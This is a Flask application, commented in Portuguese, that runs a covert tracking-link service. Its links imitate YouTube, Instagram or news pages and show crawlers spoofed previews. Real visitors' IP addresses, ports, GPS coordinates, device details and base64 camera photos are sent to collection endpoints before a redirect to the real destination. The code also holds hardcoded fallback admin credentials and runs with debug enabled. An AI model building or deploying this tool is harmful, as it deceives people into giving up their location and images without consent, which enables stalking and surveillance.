import os
import re
import uuid
import random
import string
import pytz
import base64
import requests
from PIL import Image
from bs4 import BeautifulSoup
from datetime import datetime, timedelta
from functools import wraps
from flask import (
    Flask, request, render_template, jsonify, redirect,
    url_for, flash, session, send_from_directory
)
from flask_sqlalchemy import SQLAlchemy
from flask_migrate import Migrate
from werkzeug.utils import secure_filename
from werkzeug.datastructures import FileStorage # Importar explicitamente para type hinting
import logging
import socket
# Configuração básica de logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

# 🔥 Inicializa o Flask
app = Flask(__name__, instance_relative_config=True)
# ⚠️ AVISO DE SEGURANÇA: Senha hardcoded é INSEGURA para produção.
# Use variáveis de ambiente ou um sistema de gerenciamento de usuários adequado.
app.secret_key = os.environ.get('SECRET_KEY', 'P@licia1080#_fallback_key') # Usar variável de ambiente ou fallback
ADMIN_USER = os.environ.get('ADMIN_USER', 'policia') # Usar variável de ambiente ou fallback
ADMIN_PASSWORD = os.environ.get('ADMIN_PASSWORD', 'Itapipoca2025#') # Usar variável de ambiente ou fallback

# 📦 Configurações do banco de dados
# Usar variável de ambiente para o caminho do DB ou fallback
db_path = os.environ.get('DATABASE_URL', 'sqlite:///' + os.path.join(app.instance_path, 'dados.db'))
app.config['SQLALCHEMY_DATABASE_URI'] = db_path
app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False

# 📁 Configurações de upload
# Pasta para imagens de preview (Open Graph)
PREVIEW_UPLOAD_FOLDER = 'static/previews'
# Pasta para fotos capturadas
CAPTURE_UPLOAD_FOLDER = 'static/upload'
ALLOWED_EXTENSIONS = {'png', 'jpg', 'jpeg', 'gif'}
app.config['PREVIEW_UPLOAD_FOLDER'] = PREVIEW_UPLOAD_FOLDER
app.config['CAPTURE_UPLOAD_FOLDER'] = CAPTURE_UPLOAD_FOLDER
app.config['MAX_CONTENT_LENGTH'] = 10 * 1024 * 1024 # Limite de 10MB (para fotos capturadas)

# 📂 Garante que as pastas necessárias existem
os.makedirs(app.instance_path, exist_ok=True)
os.makedirs(app.config['PREVIEW_UPLOAD_FOLDER'], exist_ok=True)
os.makedirs(app.config['CAPTURE_UPLOAD_FOLDER'], exist_ok=True)

# 📚 Inicializa o banco e migrações
db = SQLAlchemy(app)
migrate = Migrate(app, db) # Adicionado Flask-Migrate

# --- Modelos do Banco de Dados ---
class Link(db.Model):
    """Representa um link de rastreamento criado."""
    id = db.Column(db.Integer, primary_key=True)
    slug = db.Column(db.String(100), unique=True, nullable=False)
    destino = db.Column(db.String(500), nullable=False) # Aumentado o tamanho para URLs longas
    nome_investigado = db.Column(db.String(200))
    plataforma = db.Column(db.String(50)) # Ex: youtube, instagram, noticia
    
    # Campos para pré-visualização personalizada (Open Graph/Twitter Card)
    preview_titulo = db.Column(db.String(255))
    preview_descricao = db.Column(db.String(500))
    preview_imagem = db.Column(db.String(255)) # Nome do arquivo da imagem salva no PREVIEW_UPLOAD_FOLDER
    
    created_at = db.Column(db.DateTime, default=lambda: horario_brasilia()) # Usar lambda para default
    foi_testado = db.Column(db.Boolean, default=False)

    # Relacionamentos com exclusão em cascata
    ips_iniciais = db.relationship('IPInicial', backref='link_rel', lazy=True, cascade="all, delete-orphan")
    registros_acesso = db.relationship('RegistroAcesso', backref='link_rel', lazy=True, cascade="all, delete-orphan")

    def __repr__(self):
        return f"<Link slug='{self.slug}' destino='{self.destino[:50]}...'>"

class IPInicial(db.Model):
    """Registra o primeiro acesso de IP a um link (antes do clique/interação)."""
    id = db.Column(db.Integer, primary_key=True)
    slug = db.Column(db.String(100), db.ForeignKey('link.slug', ondelete='CASCADE')) # ondelete='CASCADE' para exclusão automática
    ip_v4 = db.Column(db.String(45))
    ip_v6 = db.Column(db.String(45))
    porta = db.Column(db.Integer())
    data_hora = db.Column(db.DateTime, default=lambda: horario_brasilia()) # Usar lambda para default

    def __repr__(self):
        return f"<IPInicial slug='{self.slug}' ip='{self.ip_v4 or self.ip_v6}'>"

class RegistroAcesso(db.Model):
    """Registra dados detalhados após interação do usuário (clique, foto, etc.)."""
    ip_servidor = db.Column(db.String(45))      # Novo campo
    porta_servidor = db.Column(db.String(10))
    id = db.Column(db.Integer, primary_key=True)
    slug = db.Column(db.String(100), db.ForeignKey('link.slug', ondelete='CASCADE')) # ondelete='CASCADE'
    ip_v4 = db.Column(db.String(45))
    ip_v6 = db.Column(db.String(45))
    latitude = db.Column(db.String(50))
    longitude = db.Column(db.String(50))
    foto_arquivo = db.Column(db.String(255)) # Nome do arquivo da foto salva no CAPTURE_UPLOAD_FOLDER
    sistema = db.Column(db.String(100))
    navegador = db.Column(db.String(200))
    idioma = db.Column(db.String(50))
    fuso_horario = db.Column(db.String(100))
    conexao = db.Column(db.String(100)) # Tipo de conexão (e.g., wifi, cellular)
    largura_tela = db.Column(db.Integer)
    altura_tela = db.Column(db.Integer)
    tempo_segundos = db.Column(db.Integer) # Tempo na página antes da ação
    data_hora = db.Column(db.DateTime, default=lambda: horario_brasilia()) # Usar lambda para default
    porta_r = db.Column(db.String(45)) # Porta remota

    def __repr__(self):
        return f"<RegistroAcesso slug='{self.slug}' ip='{self.ip_v4 or self.ip_v6}' data='{self.data_hora}'>"

# O modelo `Registro` parece duplicado e não utilizado na lógica de coleta.
# Mantê-lo comentado ou removê-lo para evitar confusão.
# class Registro(db.Model):
#     id = db.Column(db.Integer, primary_key=True)
#     ip = db.Column(db.String(100))
#     user_agent = db.Column(db.String(300))
#     latitude = db.Column(db.String(50))
#     longitude = db.Column(db.String(50))
#     porta = db.Column(db.Integer())
#     timestamp = db.Column(db.String(50)) # Melhor usar DateTime
#     foto_base64 = db.Column(db.Text) # Melhor salvar como arquivo
#     slug = db.Column(db.String(100), db.ForeignKey('link.slug'))
#     link = db.relationship('Link', backref='registros')

class RegistroBot(db.Model):
    """Registra acessos identificados como bots."""
    id = db.Column(db.Integer, primary_key=True)
    ip = db.Column(db.String(100))
    user_agent = db.Column(db.String(300))
    timestamp = db.Column(db.DateTime, default=lambda: horario_brasilia()) # Usar DateTime
    slug = db.Column(db.String(100)) # Não precisa ser FK se não há relação direta com Link
    cidade = db.Column(db.String(100))
    estado = db.Column(db.String(100))
    pais = db.Column(db.String(100))

    def __repr__(self):
        return f"<RegistroBot slug='{self.slug}' ip='{self.ip}' data='{self.timestamp}'>"


# Cria as tabelas se não existirem
with app.app_context():
    db.create_all()

# --- Funções Auxiliares ---
@app.route('/info_servidor')
def info_servidor():
    host = request.host.split(':')
    try:
        ip_servidor = socket.gethostbyname(host[0])
    except Exception:
        ip_servidor = host[0]
    if len(host) > 1:
        porta_servidor = host[1]
    else:
        porta_servidor = '443' if request.scheme == 'https' else '80'
    return jsonify({'ip_servidor': ip_servidor, 'porta_servidor': porta_servidor})

def horario_brasilia() -> datetime:
    """Retorna o objeto datetime atual no fuso horário de Brasília."""
    fuso_brasilia = pytz.timezone('America/Sao_Paulo')
    return datetime.now(fuso_brasilia)

def extensao_permitida(nome_arquivo: str) -> bool:
    """Verifica se a extensão do arquivo é permitida para upload."""
    return '.' in nome_arquivo and \
           nome_arquivo.rsplit('.', 1)[1].lower() in ALLOWED_EXTENSIONS

def gerar_slug(tamanho: int = 8) -> str:
    """Gera um slug alfanumérico aleatório."""
    caracteres = string.ascii_letters + string.digits
    return ''.join(random.choices(caracteres, k=tamanho))

def analisar_user_agent(user_agent: str | None) -> dict:
    """Tenta extrair informações de OS, dispositivo e navegador do User-Agent."""
    if not user_agent:
        return {"sistema": "Desconhecido", "dispositivo": "Desconhecido", "navegador": "Desconhecido"}

    ua_lower = user_agent.lower()
    sistema = "Desconhecido"
    dispositivo = "Desconhecido"
    navegador = "Desconhecido"

    # Detectar Sistema Operacional e Dispositivo
    if "android" in ua_lower:
        sistema_match = re.search(r"android[\s/][\d\.]+", ua_lower)
        sistema = sistema_match.group(0).replace("android", "Android") if sistema_match else "Android"
        dispositivo_match = re.search(r";\s?([^;]*)\sbuild", ua_lower)
        dispositivo = dispositivo_match.group(1).strip() if dispositivo_match else "Android genérico"
    elif "iphone" in ua_lower:
        sistema = "iOS"
        dispositivo = "iPhone"
    elif "ipad" in ua_lower:
        sistema = "iOS"
        dispositivo = "iPad"
    elif "windows" in ua_lower:
        sistema_match = re.search(r"windows nt [\d\.]+", ua_lower)
        sistema = sistema_match.group(0).replace("windows nt", "Windows") if sistema_match else "Windows"
        dispositivo = "PC"
    elif "macintosh" in ua_lower or "mac os x" in ua_lower:
        sistema = "macOS"
        dispositivo = "Mac"
    elif "linux" in ua_lower:
        sistema = "Linux"
        dispositivo = "PC/Dispositivo"
    elif "x11" in ua_lower:
        dispositivo = "Unix/Linux"

    # Detectar Navegador (ordem importa)
    if "chrome" in ua_lower and "safari" in ua_lower and "edg" not in ua_lower:
        navegador_match = re.search(r"chrome\/[\d\.]+", ua_lower)
        navegador = navegador_match.group(0).replace("chrome", "Chrome") if navegador_match else "Chrome"
    elif "firefox" in ua_lower:
        navegador_match = re.search(r"firefox\/[\d\.]+", ua_lower)
        navegador = navegador_match.group(0).replace("firefox", "Firefox") if navegador_match else "Firefox"
    elif "safari" in ua_lower and "chrome" not in ua_lower:
        navegador_match = re.search(r"version\/[\d\.]+ safari", ua_lower)
        navegador = navegador_match.group(0).replace("version", "Safari Version").replace("safari", "").strip() if navegador_match else "Safari"
    elif "edg" in ua_lower:
        navegador_match = re.search(r"edg\/[\d\.]+", ua_lower)
        navegador = navegador_match.group(0).replace("edg", "Edge") if navegador_match else "Edge"
    elif "opr" in ua_lower or "opera" in ua_lower:
        navegador_match = re.search(r"opr\/[\d\.]+", ua_lower) or re.search(r"opera\/[\d\.]+", ua_lower)
        navegador = navegador_match.group(0).replace("opr", "Opera").replace("opera", "Opera") if navegador_match else "Opera"
    elif "msie" in ua_lower or "trident" in ua_lower:
        navegador = "Internet Explorer"

    return {
        "sistema": sistema,
        "dispositivo": dispositivo,
        "navegador": navegador
    }


# --- Funções de Autenticação ---

@app.route("/", methods=["GET", "POST"])
def login():
    """Rota para login do usuário."""
    if request.method == "POST":
        usuario = request.form.get("usuario")
        senha = request.form.get("senha")
        if usuario == ADMIN_USER and senha == ADMIN_PASSWORD:
            session["logado"] = True
            logging.info(f"Usuário '{usuario}' logado com sucesso.")
            return redirect(url_for("gerenciar"))
        else:
            logging.warning(f"Tentativa de login falhou para o usuário '{usuario}'.")
            flash("Usuário ou senha incorretos.", "danger")
            return render_template("login.html")
    return render_template("login.html")

@app.route("/logout")
def logout():
    """Rota para logout do usuário."""
    session.pop("logado", None)
    flash("Você foi desconectado.", "info")
    logging.info("Usuário deslogado.")
    return redirect(url_for("login"))

def login_requerido(f):
    """Decorador para rotas que exigem autenticação."""
    @wraps(f)
    def decorated_function(*args, **kwargs):
        if not session.get("logado"):
            flash("Você precisa estar logado para acessar esta página.", "warning")
            return redirect(url_for("login"))
        return f(*args, **kwargs)
    return decorated_function

# --- Rotas do Painel Administrativo ---

@app.route("/gerenciar")
@login_requerido
def gerenciar():
    """Página principal do painel de gerenciamento."""
    return render_template("gerenciar.html")

@app.route("/todos_links")
@login_requerido
def todos_links():
    """Exibe a lista de todos os links criados."""
    links = Link.query.order_by(Link.created_at.desc()).all()
    return render_template("todos_links.html", links=links)

@app.route("/excluir_link/<int:link_id>", methods=["POST"])
@login_requerido
def excluir_link(link_id: int):
    """Exclui um link e todos os dados associados."""
    link = Link.query.get_or_404(link_id)

    # Excluir arquivo de imagem de preview, se existir
    if link.preview_imagem:
        caminho_imagem = os.path.join(app.config['PREVIEW_UPLOAD_FOLDER'], os.path.basename(link.preview_imagem))
        if os.path.exists(caminho_imagem):
            try:
                os.remove(caminho_imagem)
                logging.info(f"Imagem de preview excluída: {caminho_imagem}")
            except OSError as e:
                logging.error(f"Erro ao excluir imagem de preview {caminho_imagem}: {e}")

    # A exclusão em cascata nos modelos cuidará de IPInicial e RegistroAcesso
    db.session.delete(link)

    try:
        db.session.commit()
        flash(f"Link '{link.slug}' e dados associados excluídos com sucesso!", "success")
        logging.info(f"Link excluído: {link.slug}")
    except Exception as e:
        db.session.rollback()
        flash(f"Erro ao excluir link '{link.slug}': {e}", "danger")
        logging.error(f"Erro ao excluir link {link.slug}: {e}")

    return redirect(url_for('todos_links'))

@app.route("/painel")
@login_requerido
def painel():
    """Exibe o painel com registros de acesso e IPs iniciais."""
    registros_acesso = RegistroAcesso.query.order_by(RegistroAcesso.data_hora.desc()).all()
    ips_iniciais = IPInicial.query.order_by(IPInicial.data_hora.desc()).all()

    # Criar um dicionário para mapear slug para nome_investigado para exibição
    todos_links = Link.query.all()
    links_dict = {link.slug: link.nome_investigado for link in todos_links}

    return render_template("painel.html",
                           registros=registros_acesso, # Renomeado para consistência com o template
                           ips_iniciais=ips_iniciais,
                           links=links_dict) # Passa o dicionário de links

# --- Rotas de Criação e Upload ---

@app.route("/criar_link", methods=["GET", "POST"])
@login_requerido
def criar_link():
    """Rota para criar um novo link de rastreamento."""
    if request.method == "POST":
        slug = request.form.get('slug')
        destino = request.form.get('destino')
        nome_investigado = request.form.get('nome_investigado')
        plataforma = request.form.get('plataforma')

        # Campos da pré-visualização personalizada
        preview_titulo = request.form.get('preview_titulo')
        preview_descricao = request.form.get('preview_descricao')
        # A URL da imagem de preview vem do JS após upload para /upload_imagem
        preview_imagem_url = request.form.get('preview_imagem_url')

        # Validação básica
        if not destino:
            flash("O campo 'URL de Destino Final' é obrigatório!", "warning")
            return redirect(url_for('criar_link'))

        # Se slug não foi fornecido, gera um aleatório
        if not slug:
            slug = gerar_slug()
            # Garante que o slug gerado é único (simples, pode ser otimizado para muitos links)
            while Link.query.filter_by(slug=slug).first():
                 slug = gerar_slug()

        # Verifica se o slug já existe se foi fornecido
        elif Link.query.filter_by(slug=slug).first():
             flash(f"O slug '{slug}' já está em uso. Por favor, escolha outro.", "warning")
             return redirect(url_for('criar_link'))


        novo_link = Link(
            slug=slug,
            destino=destino,
            nome_investigado=nome_investigado,
            plataforma=plataforma,
            preview_titulo=preview_titulo,
            preview_descricao=preview_descricao,
            preview_imagem=preview_imagem_url # Salva a URL retornada pelo upload
        )

        try:
            db.session.add(novo_link)
            db.session.commit()
            flash("Link criado com sucesso!", "success")
            logging.info(f"Link criado: {slug}")
            return redirect(url_for('todos_links'))
        except Exception as e:
            db.session.rollback()
            flash(f"Erro ao criar link: {e}", "danger")
            logging.error(f"Erro ao criar link {slug}: {e}")
            return redirect(url_for('criar_link'))

    return render_template('criar_link.html')

@app.route("/upload_imagem", methods=["POST"])
def upload_imagem():
    """
    Rota para receber e processar o upload de imagens de preview.
    Redimensiona, converte para JPG e salva.
    Retorna a URL pública da imagem salva.
    """
    if "imagem" not in request.files:
        return jsonify({"erro": "Nenhuma imagem enviada"}), 400

    arquivo: FileStorage = request.files["imagem"]

    if arquivo.filename == "":
        return jsonify({"erro": "Nome de arquivo vazio"}), 400

    if arquivo and extensao_permitida(arquivo.filename):
        try:
            # Gera um nome único para o arquivo JPG
            nome_unico = f"{uuid.uuid4().hex}.jpg"
            caminho_completo = os.path.join(app.config["PREVIEW_UPLOAD_FOLDER"], nome_unico)

            # Abre, converte e redimensiona a imagem
            img = Image.open(arquivo)
            img = img.convert("RGB") # Garante que seja RGB antes de salvar como JPG
            img.thumbnail((1200, 1200), Image.Resampling.LANCZOS) # Usa thumbnail para manter proporção, max 1200px

            # Salva a imagem otimizada como JPG
            img.save(caminho_completo, "JPEG", quality=85)

            # Constrói a URL pública
            # Use request.url_root para obter a base URL dinâmica
            url_imagem = f"{request.url_root}{app.config['PREVIEW_UPLOAD_FOLDER']}/{nome_unico}"

            logging.info(f"Imagem de preview salva: {nome_unico}")
            return jsonify({"url": url_imagem}), 200

        except Exception as e:
            logging.error(f"Erro ao processar imagem de preview: {e}", exc_info=True)
            return jsonify({"erro": f"Erro ao processar imagem: {e}"}), 500
    else:
        return jsonify({"erro": "Extensão de arquivo não permitida. Use PNG, JPG, JPEG ou GIF."}), 400

# --- Rotas de Rastreamento e Coleta de Dados ---

@app.route("/link/<slug>")
@app.route("/r/<slug>")
def rastrear_link(slug: str):
    """
    Rota principal para o link de rastreamento.
    Serve o template apropriado (preview para bots, template de plataforma para usuários).
    A coleta de dados é feita via JavaScript no template.
    """
    link = Link.query.filter_by(slug=slug).first_or_404()
    user_agent = request.headers.get("User-Agent", "").lower()

    # Lista de user agents comuns de bots de redes sociais/mensageiros
    bots = ["facebookexternalhit", "twitterbot", "linkedinbot", "whatsapp", "slackbot", "telegrambot", "discordbot"]
    is_bot = any(bot in user_agent for bot in bots)

    if is_bot:
        logging.info(f"Acesso de bot ao slug '{slug}' (UA: {user_agent[:100]}...)")
        # Prioriza o preview personalizado, se existir
        if link.preview_titulo and link.preview_imagem:
            # preview_imagem já deve ser a URL completa salva no DB
            return render_template("preview_real.html",
                titulo=link.preview_titulo,
                descricao=link.preview_descricao or "Clique para visualizar o conteúdo.",
                imagem=link.preview_imagem, # Usar a URL salva
                url_destino=link.destino
            )

        # Tenta buscar as OG tags da página de destino
        try:
            # Simula um user agent de bot para obter as OG tags corretas
            headers = {
                "User-Agent": "facebookexternalhit/1.1 (+http://www.facebook.com/externalhit_uatext.php)"
            }
            # Adiciona timeout para evitar que o servidor trave em requisições lentas
            resposta = requests.get(link.destino, headers=headers, timeout=10)
            resposta.raise_for_status() # Levanta um erro para status HTTP ruins (4xx, 5xx)
            soup = BeautifulSoup(resposta.text, "html.parser")

            og_title_tag = soup.find("meta", property="og:title")
            og_desc_tag = soup.find("meta", property="og:description")
            og_image_tag = soup.find("meta", property="og:image")
            og_url_tag = soup.find("meta", property="og:url") # Tenta obter a URL canônica

            og_title = og_title_tag["content"] if og_title_tag and og_title_tag.get("content") else "Acesse este link"
            og_desc = og_desc_tag["content"] if og_desc_tag and og_desc_tag.get("content") else "Clique para visualizar o conteúdo."
            og_image = og_image_tag["content"] if og_image_tag and og_image_tag.get("content") else url_for('static', filename='fallback.jpg', _external=True)
            og_url = og_url_tag["content"] if og_url_tag and og_url_tag.get("content") else link.destino # Usa a URL do link se OG URL não encontrada

            # O template preview_real.html deve usar og_url para o link canônico se necessário
            return render_template("preview_real.html",
                titulo=og_title,
                descricao=og_desc,
                imagem=og_image,
                url_destino=link.destino,
                og_url=og_url # Passa a URL canônica encontrada ou o destino original
            )

        except requests.exceptions.RequestException as e:
            logging.error(f"Erro ao buscar OG tags para '{link.destino}': {e}")
            # Fallback para preview básico se a requisição falhar
            pass
        except Exception as e:
             logging.error(f"Erro ao processar OG tags para '{link.destino}': {e}", exc_info=True)
             # Fallback para preview básico se o parsing falhar
             pass

        # Fallback final para preview básico se tudo mais falhar
        return render_template("preview_fallback.html", url_destino=link.destino)

    # Visitante real: serve o template da plataforma escolhida
    logging.info(f"Acesso de usuário real ao slug '{slug}' (UA: {user_agent[:100]}...)")
    template_escolhido = f"{link.plataforma.lower()}.html" if link.plataforma and link.plataforma != 'default' else "padrao.html"

    # Verifica se o template existe, caso contrário usa o padrão
    if not os.path.exists(os.path.join(app.root_path, 'templates', template_escolhido)):
        logging.warning(f"Template '{template_escolhido}' não encontrado para o slug '{slug}'. Usando 'padrao.html'.")
        template_escolhido = "padrao.html"

    # O template renderizado (e.g., youtube.html) deve conter o JavaScript
    # que coleta os dados e os envia para as rotas /coletar_ip_inicial e /coletar_dados
    return render_template(template_escolhido, slug=slug, destino=link.destino, link=link)

@app.route("/coletar_ip_inicial", methods=["POST"])
def coletar_ip_inicial():
    """
    Recebe e salva dados de IP iniciais enviados pelo JavaScript no cliente.
    """
    dados = request.get_json()
    if not dados or 'slug' not in dados:
        logging.warning("Tentativa de coletar_ip_inicial sem dados ou slug.")
        return jsonify({"status": "erro", "mensagem": "Dados inválidos"}), 400

    slug = dados.get("slug")
    ip_v4 = dados.get("ip_v4")
    ip_v6 = dados.get("ip_v6")
    porta = int(dados.get("porta") or 0) # Converte para int, default 0

    # Opcional: Verificar se o slug existe antes de salvar
    # link = Link.query.filter_by(slug=slug).first()
    # if not link:
    #     logging.warning(f"Coleta de IP inicial para slug inexistente: {slug}")
    #     return jsonify({"status": "erro", "mensagem": "Link não encontrado"}), 404

    novo_ip = IPInicial(
        slug=slug,
        ip_v4=ip_v4,
        ip_v6=ip_v6,
        porta=porta
    )

    try:
        db.session.add(novo_ip)
        db.session.commit()
        logging.info(f"IP inicial coletado para slug '{slug}': {ip_v4 or ip_v6}")
        return jsonify({"status": "ok"}), 200
    except Exception as e:
        db.session.rollback()
        logging.error(f"Erro ao salvar IP inicial para slug '{slug}': {e}", exc_info=True)
        return jsonify({"status": "erro", "mensagem": "Erro ao salvar dados"}), 500


@app.route("/coletar_dados", methods=["POST"])
def coletar_dados():
    """
    Recebe e salva dados detalhados de acesso (localização, foto, etc.)
    enviados pelo JavaScript no cliente após interação.
    """
    dados = request.get_json()
    if not dados or 'slug' not in dados:
        logging.warning("Tentativa de coletar_dados sem dados ou slug.")
        return jsonify({"status": "erro", "mensagem": "Dados inválidos"}), 400

    slug = dados.get("slug")
    foto_base64 = dados.get("foto_base64")
    nome_arquivo_foto = None

    # Processar e salvar imagem base64, se enviada
    if foto_base64:
        try:
            # Remove o prefixo 'data:image/jpeg;base64,' ou similar
            base64_data = foto_base64.split(",")[-1]
            imagem_bytes = base64.b64decode(base64_data)

            # Gera nome único e caminho
            # Usa slug e timestamp para nomear o arquivo
            timestamp_str = datetime.utcnow().strftime('%Y%m%d%H%M%S%f') # Adiciona microssegundos para mais unicidade
            nome_arquivo_foto = f"{slug}_{timestamp_str}.jpg"
            caminho_completo_foto = os.path.join(app.config['CAPTURE_UPLOAD_FOLDER'], nome_arquivo_foto)

            # Salva o arquivo
            with open(caminho_completo_foto, "wb") as f:
                f.write(imagem_bytes)

            logging.info(f"Foto capturada salva para slug '{slug}': {nome_arquivo_foto}")

        except Exception as e:
            logging.error(f"Erro ao processar ou salvar imagem base64 para slug '{slug}': {e}", exc_info=True)
            nome_arquivo_foto = None # Garante que não salva nome de arquivo inválido

    # Opcional: Analisar User Agent aqui se quiser salvar mais detalhes no RegistroAcesso
    # user_agent_info = analisar_user_agent(dados.get("userAgent"))

    novo_registro = RegistroAcesso(
        slug=slug,
        ip_v4=dados.get("ip_v4"),
        ip_v6=dados.get("ip_v6"),
        latitude=dados.get("latitude"),
        longitude=dados.get("longitude"),
        foto_arquivo=nome_arquivo_foto, # Salva apenas o nome do arquivo
        sistema=dados.get("plataforma"), # Este campo parece estar sendo usado para OS/Dispositivo no JS
        navegador=dados.get("userAgent"), # Salvando o UserAgent completo
        idioma=dados.get("idioma"),
        fuso_horario=dados.get("fusoHorario"),
        conexao=dados.get("conexao"),
        largura_tela=int(dados.get("larguraTela", 0)),
        altura_tela=int(dados.get("alturaTela", 0)),
        porta_r=dados.get("porta"), # Porta remota
        tempo_segundos=int(dados.get("tempoSegundos", 0)),
        ip_servidor=dados.get("ip_servidor"),
        porta_servidor=dados.get("porta_servidor")
    )

    try:
        db.session.add(novo_registro)
        db.session.commit()
        logging.info(f"Dados detalhados coletados para slug '{slug}'.")
        # Retorna o destino final para o JS redirecionar
        link = Link.query.filter_by(slug=slug).first()
        destino = link.destino if link else "/login" # Redireciona para login se o link sumiu

        return jsonify({
            "status": "ok",
            "destino": destino,
            "foto_nome": nome_arquivo_foto
        }), 200
    except Exception as e:
        db.session.rollback()
        logging.error(f"Erro ao salvar dados detalhados para slug '{slug}': {e}", exc_info=True)
        return jsonify({"status": "erro", "mensagem": "Erro ao salvar dados"}), 500

# --- Rota de Redirecionamento Final ---
@app.route("/redir/<slug>")
def redirecionar(slug: str):
    """
    Página intermediária para garantir que o redirecionamento final ocorra
    após a coleta de dados pelo JavaScript.
    """
    link = Link.query.filter_by(slug=slug).first() # Não usa first_or_404 para evitar erro se o link for excluído
    destino = link.destino if link else url_for('login') # Redireciona para login se o link não existir mais

    # O template redirect.html simplesmente usa JS para window.location.href = destino
    return render_template("redirect.html", destino=destino)


# --- Outras Rotas ---
@app.route("/ping")
def ping():
    """Health check endpoint."""
    return "pong", 200

# Rota para servir arquivos estáticos de upload (se necessário, embora url_for já faça isso)
# @app.route('/static/upload/<filename>')
# def uploaded_file(filename):
#     return send_from_directory(app.config['CAPTURE_UPLOAD_FOLDER'], filename)

# Rota para servir arquivos estáticos de preview (se necessário)
# @app.route('/static/previews/<filename>')
# def preview_file(filename):
#      return send_from_directory(app.config['PREVIEW_UPLOAD_FOLDER'], filename)


# Inicia o servidor
if __name__ == "__main__":
    # Em produção, use um servidor WSGI como Gunicorn ou uWSGI
    # app.run(debug=False, host='0.0.0.0', port=int(os.environ.get('PORT', 5000)))
    app.run(debug=True) # Use debug=False em produção
